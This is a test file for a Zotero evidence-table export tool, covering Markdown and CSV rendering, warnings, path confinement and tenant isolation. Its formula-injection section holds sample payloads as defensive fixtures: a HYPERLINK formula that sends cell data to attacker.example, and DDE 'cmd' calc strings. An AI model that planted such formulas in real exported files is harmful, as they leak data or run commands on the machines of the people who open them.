import { describe, it, expect } from 'vitest';
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import evidenceTable from '../../src/tools/evidence-table.js';

/**
 * An RFC 4180 reader written independently of the renderer, so a round trip proves the
 * quoting is right rather than proving the two halves share a bug.
 */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let inQuotes = false;
  let i = 0;
  while (i < text.length) {
    const c = text[i];
    if (inQuotes) {
      if (c === '"') {
        if (text[i + 1] === '"') {
          field += '"';
          i += 2;
          continue;
        }
        inQuotes = false;
        i++;
        continue;
      }
      field += c;
      i++;
      continue;
    }
    if (c === '"' && field === '') {
      inQuotes = true;
      i++;
      continue;
    }
    if (c === ',') {
      row.push(field);
      field = '';
      i++;
      continue;
    }
    if (c === '\r' && text[i + 1] === '\n') {
      row.push(field);
      rows.push(row);
      row = [];
      field = '';
      i += 2;
      continue;
    }
    if (c === '\n' || c === '\r') {
      row.push(field);
      rows.push(row);
      row = [];
      field = '';
      i++;
      continue;
    }
    field += c;
    i++;
  }
  if (field !== '' || row.length) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

function ctx(over: Record<string, unknown> = {}) {
  return {
    config: { dataDir: mkdtempSync(join(tmpdir(), 'zoteus-evidence-')) },
    remoteCaller: false,
    logger: { debug() {}, info() {}, warn() {}, error() {} },
    ...over,
  } as any;
}

const ROW = {
  item_key: 'ABCD1234',
  study: 'Kalman & Bucy (1961)',
  finding: 'Filter converges under observability.',
  quotation: 'the covariance remains bounded',
  page: '99',
  page_exact: true,
  coverage: 'passage' as const,
  support: 'supported' as const,
};

async function call(args: Record<string, unknown>, over: Record<string, unknown> = {}) {
  return (await evidenceTable.handler({ question: 'Does it converge?', ...args }, ctx(over))) as any;
}

/** The body rows of the rendered Markdown table, header and separator dropped. */
function bodyLines(table: string): string[] {
  return table.split('\n').filter((l) => l.startsWith('| ') && !l.startsWith('| Study') && !l.startsWith('|---'));
}

describe('zotero_evidence_table rendering', () => {
  it('is annotated read-only and does not open the world', () => {
    expect(evidenceTable.annotations?.readOnlyHint).toBe(true);
    expect(evidenceTable.annotations?.openWorldHint).toBe(false);
  });

  it('renders the published column set with the locator quality visible', async () => {
    const res = await call({ rows: [ROW] });
    expect(res.isError).toBeFalsy();
    const table = res.structuredContent.table as string;
    expect(table).toContain('| Study | Finding | Quotation | Locator | Coverage | Support |');
    expect(table).toContain('Kalman & Bucy (1961) (ABCD1234)');
    expect(table).toContain('99 (exact)');
    expect(table).toContain('passage retrieved');
    expect(res.structuredContent.format).toBe('markdown');
    expect(res.structuredContent.rowCount).toBe(1);
  });

  it('marks the library text it carries as untrusted', async () => {
    const res = await call({ rows: [ROW] });
    expect(res.structuredContent.provenance).toMatchObject({ source: 'library-content', trust: 'untrusted' });
  });

  it('labels an approximate page as approximate, and an unstated one as unstated', async () => {
    const res = await call({
      rows: [
        { ...ROW, page: '12', page_exact: false },
        { ...ROW, item_key: 'EEEE1111', page: '13', page_exact: undefined },
      ],
    });
    const table = res.structuredContent.table as string;
    expect(table).toContain('12 (approximate)');
    expect(table).toContain('13 (exact or approximate not stated)');
  });

  it('renders a missing locator and a missing quotation as visible gaps, not blank cells', async () => {
    const res = await call({
      rows: [{ ...ROW, quotation: undefined, page: undefined, page_exact: undefined, coverage: 'unavailable', support: 'unverified' }],
    });
    const line = bodyLines(res.structuredContent.table as string)[0];
    expect(line).toContain('(none retrieved)');
    expect(line).toContain('(none reported)');
    // Dropping the empty strings either side of the leading and trailing pipe, no cell is blank.
    expect(line.split('|').slice(1, -1).some((c) => c.trim() === '')).toBe(false);
  });

  it('adds a Notes column only when a row has a note', async () => {
    const without = await call({ rows: [ROW] });
    expect(without.structuredContent.table).not.toContain('Notes');
    const withNote = await call({ rows: [ROW, { ...ROW, item_key: 'EEEE1111', note: 'Simulation only.' }] });
    const table = withNote.structuredContent.table as string;
    expect(table).toContain('| Study | Finding | Quotation | Locator | Coverage | Support | Notes |');
    expect(table).toContain('Simulation only.');
  });
});

describe('zotero_evidence_table Markdown escaping', () => {
  it('escapes a pipe in a quotation so the row keeps its columns', async () => {
    const res = await call({ rows: [{ ...ROW, quotation: 'state | measurement' }] });
    const line = bodyLines(res.structuredContent.table as string)[0];
    expect(line).toContain('state \\| measurement');
    // Splitting on pipes that are NOT escaped must still yield the 6 cells plus the empty
    // strings either side of the leading and trailing pipe.
    expect(line.split(/(?<!\\)\|/).length).toBe(8);
  });

  it('escapes a backslash before a pipe, so a literal \\| survives as text', async () => {
    const res = await call({ rows: [{ ...ROW, quotation: 'a\\|b' }] });
    // Backslash doubled, then the pipe escaped: '\\' + '\|' is how GFM spells a literal \|.
    expect(res.structuredContent.table as string).toContain('a' + '\\\\' + '\\|' + 'b');
  });

  it('folds a line break inside a quotation into a space, because a newline ends the row', async () => {
    const res = await call({ rows: [{ ...ROW, quotation: 'first line\nsecond line' }] });
    const line = bodyLines(res.structuredContent.table as string)[0];
    expect(line).toContain('first line second line');
    expect(line).not.toContain('\n');
  });
});

describe('zotero_evidence_table CSV', () => {
  it('round-trips a quotation containing a comma, a double quote and a newline', async () => {
    const quotation = 'He wrote, "it is bounded",\nand then stopped';
    const res = await call({ rows: [{ ...ROW, quotation, note: 'a, b' }], format: 'csv' });
    const csv = res.structuredContent.table as string;
    const parsed = parseCsv(csv);
    expect(parsed[0]).toEqual([
      'Item key',
      'Study',
      'Finding',
      'Quotation',
      'Locator',
      'Locator quality',
      'Coverage',
      'Support',
      'Notes',
    ]);
    expect(parsed).toHaveLength(2);
    // The quotation comes back byte for byte, newline included.
    expect(parsed[1][3]).toBe(quotation);
    expect(parsed[1][0]).toBe('ABCD1234');
    expect(parsed[1][4]).toBe('99');
    expect(parsed[1][5]).toBe('exact');
    expect(parsed[1][6]).toBe('passage retrieved');
    expect(parsed[1][8]).toBe('a, b');
  });

  it('preserves edge whitespace by quoting it', async () => {
    const quotation = '  padded  ';
    const res = await call({ rows: [{ ...ROW, quotation }], format: 'csv' });
    expect(parseCsv(res.structuredContent.table as string)[1][3]).toBe(quotation);
  });

  it('leaves the CSV free of the caption, the coverage line and the warnings', async () => {
    const res = await call({
      rows: [{ ...ROW, quotation: undefined }],
      format: 'csv',
    });
    const csv = res.structuredContent.table as string;
    expect(res.structuredContent.warnings.length).toBeGreaterThan(0);
    expect(csv).not.toContain('Evidence table');
    expect(csv).not.toContain('Coverage:');
    expect(csv).not.toContain('Row 1');
    // Header plus one row, and nothing else.
    expect(parseCsv(csv)).toHaveLength(2);
  });
});

describe('zotero_evidence_table coverage summary', () => {
  it('counts the rows rather than taking the caller\'s word for it', async () => {
    const res = await call({
      rows: [
        ROW,
        { ...ROW, item_key: 'BBBB2222' },
        { ...ROW, item_key: 'CCCC3333', quotation: undefined, page: undefined, coverage: 'abstract-only', support: 'uncertain' },
        { ...ROW, item_key: 'DDDD4444', quotation: undefined, page: undefined, coverage: 'unavailable', support: 'unverified' },
      ],
    });
    expect(res.structuredContent.coverage).toEqual({ passage: 2, abstractOnly: 1, unavailable: 1 });
    expect(res.structuredContent.rowCount).toBe(4);
    expect(res.structuredContent.table).toContain('Coverage: 4 rows: 2 backed by a retrieved passage, 1 abstract only, 1 unavailable.');
    expect(res.content[0].text).toContain('2 backed by a retrieved passage');
  });
});

describe('zotero_evidence_table warnings', () => {
  it('warns when a page is given with no quotation, and still renders the row', async () => {
    const res = await call({ rows: [{ ...ROW, quotation: undefined, coverage: 'abstract-only', support: 'uncertain' }] });
    expect(res.isError).toBeFalsy();
    expect(res.structuredContent.warnings).toEqual([
      'Row 1 (ABCD1234): a page locator is given with no quotation, so the locator points at text this table does not show.',
    ]);
    expect(bodyLines(res.structuredContent.table as string)).toHaveLength(1);
    expect(res.structuredContent.table).toContain('Warnings:');
  });

  it('warns when coverage claims a passage but no quotation came with it', async () => {
    const res = await call({ rows: [{ ...ROW, quotation: undefined, page: undefined, page_exact: undefined }] });
    expect(res.structuredContent.warnings).toEqual([
      'Row 1 (ABCD1234): coverage says a passage was retrieved, but the row carries no quotation.',
    ]);
  });

  it('treats an all-whitespace quotation as no quotation', async () => {
    const res = await call({ rows: [{ ...ROW, quotation: '   ', page: undefined, page_exact: undefined }] });
    expect(res.structuredContent.warnings).toHaveLength(1);
    expect(res.structuredContent.warnings[0]).toContain('carries no quotation');
    expect(bodyLines(res.structuredContent.table as string)[0]).toContain('(none retrieved)');
  });

  it('warns when a source that could not be read is called supported', async () => {
    const res = await call({
      rows: [{ ...ROW, quotation: undefined, page: undefined, page_exact: undefined, coverage: 'unavailable', support: 'supported' }],
    });
    expect(res.structuredContent.warnings).toEqual([
      'Row 1 (ABCD1234): support says "supported" while coverage says the source could not be read at all.',
    ]);
  });

  it('names each offending row by its position and key, and leaves clean rows unnamed', async () => {
    const res = await call({
      rows: [
        ROW,
        { ...ROW, item_key: 'BBBB2222', quotation: undefined, page: undefined, page_exact: undefined, coverage: 'unavailable', support: 'supported' },
      ],
    });
    expect(res.structuredContent.warnings).toHaveLength(1);
    expect(res.structuredContent.warnings[0]).toContain('Row 2 (BBBB2222)');
    expect(res.content[0].text).toContain('contradicts its own evidence');
  });

  it('counts rows, not warnings, when one row trips two checks at once', async () => {
    const res = await call({
      rows: [{ ...ROW, quotation: undefined, page: '7', page_exact: undefined, coverage: 'unavailable', support: 'supported' }],
    });
    expect(res.structuredContent.warnings).toHaveLength(2);
    expect(res.content[0].text).toContain('1 row contradicts its own evidence (2 warnings)');
  });

  it('omits the warnings field entirely when every row agrees with itself', async () => {
    const res = await call({ rows: [ROW] });
    expect(res.structuredContent.warnings).toBeUndefined();
    expect(res.structuredContent.table).not.toContain('Warnings:');
  });
});

describe('zotero_evidence_table save_path', () => {
  it('writes the rendered table on stdio, where the caller owns the disk', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'zoteus-evidence-out-'));
    const target = join(dir, 'nested', 'table.md');
    const res = await call({ rows: [ROW], save_path: target });
    expect(res.isError).toBeFalsy();
    expect(res.structuredContent.savedTo).toBe(target);
    expect(readFileSync(target, 'utf8')).toBe(res.structuredContent.table);
  });

  it('refuses a path outside the data directory for a remote caller, and writes nothing', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'zoteus-evidence-remote-'));
    const target = join(dir, 'escaped.csv');
    const res = await call(
      { rows: [ROW], save_path: target, format: 'csv' },
      { remoteCaller: true, config: { dataDir: mkdtempSync(join(tmpdir(), 'zoteus-evidence-data-')) } },
    );
    expect(res.isError).toBe(true);
    expect(res.content[0].text).toContain('`save_path` must be inside this server\'s data directory');
    expect(existsSync(target)).toBe(false);
  });

  it('allows a remote caller a path inside its own subtree', async () => {
    const dataDir = mkdtempSync(join(tmpdir(), 'zoteus-evidence-data-'));
    const target = join(dataDir, 'tenants', 'shared', 'tables', 'table.csv');
    const res = await call({ rows: [ROW], save_path: target, format: 'csv' }, { remoteCaller: true, config: { dataDir } });
    expect(res.isError).toBeFalsy();
    expect(readFileSync(target, 'utf8')).toBe(res.structuredContent.table);
  });

  it('refuses to replace an existing file unless told to, and does not touch it', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'zoteus-evidence-clobber-'));
    const target = join(dir, 'thesis.md');
    writeFileSync(target, 'my thesis', 'utf8');
    const refused = await call({ rows: [ROW], save_path: target });
    expect(refused.isError).toBe(true);
    expect(refused.content[0].text).toContain('Nothing was written.');
    expect(readFileSync(target, 'utf8')).toBe('my thesis');

    const replaced = await call({ rows: [ROW], save_path: target, overwrite: true });
    expect(replaced.isError).toBeFalsy();
    expect(readFileSync(target, 'utf8')).toBe(replaced.structuredContent.table);
  });
});

/**
 * A quotation is lifted verbatim out of a PDF, and a PDF downloaded off the open web is
 * something a stranger wrote. `=HYPERLINK(...)`, `=IMPORTXML(...)` and the DDE `=cmd|...`
 * forms are text here and a program in Excel, LibreOffice and Sheets, which is where this
 * file is meant to be opened. RFC 4180 quoting does not help: the spreadsheet unquotes the
 * field first and then decides whether it is a formula.
 */
describe('zotero_evidence_table CSV formula injection', () => {
  const HYPERLINK = '=HYPERLINK("http://attacker.example/?x="&A1&B1,"Click for full text")';

  /** Every cell of the file, header included, as a spreadsheet would read it. */
  async function cells(rows: unknown[]): Promise<string[][]> {
    const res = await call({ rows, format: 'csv' });
    expect(res.isError).toBeFalsy();
    return parseCsv(res.structuredContent.table as string);
  }

  it('marks a quotation that would execute as text, and round-trips its characters exactly', async () => {
    const parsed = await cells([{ ...ROW, quotation: HYPERLINK }]);
    const cell = parsed[1][3];
    // The guard is one leading apostrophe, the spreadsheet's own literal-text marker, and
    // nothing else: strip it and the passage is there byte for byte, quotes and commas
    // included, so the quotation the researcher reads is still the quotation retrieved.
    expect(cell[0]).toBe("'");
    expect(cell.slice(1)).toBe(HYPERLINK);
  });

  it('leaves no cell in the file starting with a formula trigger, whichever character it is', async () => {
    const parsed = await cells([
      { ...ROW, quotation: HYPERLINK },
      { ...ROW, item_key: 'BBBB2222', quotation: '+1+1' },
      { ...ROW, item_key: 'CCCC3333', quotation: "@SUM(1+1)*cmd|' /C calc'!A0" },
      { ...ROW, item_key: 'DDDD4444', quotation: "-2+3+cmd|' /C calc'!A0" },
      { ...ROW, item_key: 'EEEE5555', quotation: '\t=1+1' },
      { ...ROW, item_key: 'FFFF6666', study: '=1+1', finding: '@A1', note: '\r=1+1' },
    ]);
    for (const row of parsed) {
      for (const cell of row) expect(cell).not.toMatch(/^[=+\-@\t\r]/);
    }
    // And each payload is still recoverable from the cell it is in.
    expect(parsed[2][3]).toBe("'+1+1");
    expect(parsed[3][3]).toBe("'@SUM(1+1)*cmd|' /C calc'!A0");
    expect(parsed[4][3]).toBe("'-2+3+cmd|' /C calc'!A0");
    expect(parsed[5][3]).toBe("'\t=1+1");
    expect(parsed[6][1]).toBe("'=1+1");
    expect(parsed[6][2]).toBe("'@A1");
    expect(parsed[6][8]).toBe("'\r=1+1");
  });

  it('leaves a negative page locator a number, because -5 is a page and not a formula', async () => {
    const parsed = await cells([
      { ...ROW, page: '-5' },
      { ...ROW, item_key: 'BBBB2222', page: '+12' },
      { ...ROW, item_key: 'CCCC3333', page: '-5 or so' },
    ]);
    expect(parsed[1][4]).toBe('-5');
    expect(parsed[2][4]).toBe('+12');
    // Not a number, so not exempt: a locator that carries prose carries whatever else too.
    expect(parsed[3][4]).toBe("'-5 or so");
  });

  it('names the guarded cell in the warnings and in the summary, rather than changing bytes silently', async () => {
    const res = await call({ rows: [ROW, { ...ROW, item_key: 'BBBB2222', quotation: HYPERLINK }], format: 'csv' });
    const warnings = res.structuredContent.warnings as string[];
    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toContain('Row 2 (BBBB2222)');
    expect(warnings[0]).toContain('Quotation');
    expect(warnings[0]).toContain('leading apostrophe');
    expect(res.content[0].text).toContain('marked as text in the CSV');
    // The row is not accused of contradicting itself: that count is about the evidence.
    expect(res.content[0].text).not.toContain('contradicts its own evidence');
  });

  it('says nothing and changes nothing in Markdown, which no spreadsheet evaluates', async () => {
    const res = await call({ rows: [{ ...ROW, quotation: HYPERLINK }] });
    expect(res.structuredContent.table).toContain(HYPERLINK);
    expect(res.structuredContent.table).not.toContain("'=HYPERLINK");
    expect(res.structuredContent.warnings).toBeUndefined();
  });

  it('still quotes an ordinary cell exactly as before, so the guard costs the other rows nothing', async () => {
    const quotation = 'He wrote, "it is bounded",\nand then stopped';
    const parsed = await cells([{ ...ROW, quotation }]);
    expect(parsed[1][3]).toBe(quotation);
  });
});

/**
 * One data directory, many tenants. The search index already keys its file by user id;
 * a table a researcher saved has at least as much claim to that.
 */
describe('zotero_evidence_table tenant isolation', () => {
  function tenant(dataDir: string, zoteroUserId: number) {
    return { remoteCaller: true, zoteroUserId, config: { dataDir } };
  }

  it('confines a hosted caller to their own subtree, not to the whole shared data directory', async () => {
    const dataDir = mkdtempSync(join(tmpdir(), 'zoteus-evidence-tenant-'));
    const mine = join(dataDir, 'tenants', '111', 'table.csv');
    const ok = await call({ rows: [ROW], save_path: mine, format: 'csv' }, tenant(dataDir, 111));
    expect(ok.isError).toBeFalsy();
    expect(ok.structuredContent.savedTo).toBe(mine);

    const theirs = join(dataDir, 'tenants', '222', 'table.csv');
    const refused = await call({ rows: [ROW], save_path: theirs, format: 'csv' }, tenant(dataDir, 111));
    expect(refused.isError).toBe(true);
    expect(existsSync(theirs)).toBe(false);
    // The refusal names the directory the caller may use, which is their own.
    expect(refused.content[0].text).toContain(join(dataDir, 'tenants', '111'));
  });

  it('will not confirm whether another tenant has a file at a given path', async () => {
    const dataDir = mkdtempSync(join(tmpdir(), 'zoteus-evidence-oracle-'));
    const theirs = join(dataDir, 'tenants', '222', 'literature-review.csv');
    mkdirSync(dirname(theirs), { recursive: true });
    writeFileSync(theirs, 'their evidence', 'utf8');

    const res = await call({ rows: [ROW], save_path: theirs, format: 'csv' }, tenant(dataDir, 111));
    expect(res.isError).toBe(true);
    // Refused for being outside the caller's directory, which is true of a path whether or
    // not a file is there. "already exists" would answer a question the caller cannot ask.
    expect(res.content[0].text).toContain('must be inside');
    expect(res.content[0].text).not.toContain('already exists');
    expect(readFileSync(theirs, 'utf8')).toBe('their evidence');
  });
});

describe('evidence export concurrent creation', () => {
  it('lets only one concurrent export create the same path without overwrite permission', async () => {
    const c = ctx();
    const save_path = join(c.config.dataDir, 'concurrent.csv');
    const results = await Promise.all(Array.from({ length: 8 }, (_, i) =>
      evidenceTable.handler({ question: 'Concurrency', rows: [{ ...ROW, study: `Study ${i}` }], format: 'csv', save_path }, c),
    ));
    const winners = results.filter((result) => !result.isError);
    expect(winners).toHaveLength(1);
    expect(readFileSync(save_path, 'utf8')).toBe((winners[0]!.structuredContent as any).table);
  });
});
